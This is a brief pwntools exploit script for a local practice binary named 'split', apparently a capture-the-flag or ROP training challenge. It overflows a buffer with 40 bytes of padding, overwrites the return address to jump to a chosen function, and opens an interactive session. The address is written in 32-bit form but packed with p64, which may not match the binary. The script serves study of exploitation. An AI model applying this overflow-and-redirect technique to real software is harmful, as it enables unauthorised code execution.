from pwn import *

p = process('./split')
junk = "A" * 40
usefulFunction_addr = 0x08048649

p.recvuntil('> ')
payload = junk + p64(usefulFunction_addr)
p.sendline(payload)
#p.recvuntil('Exiting')

p.interactive()
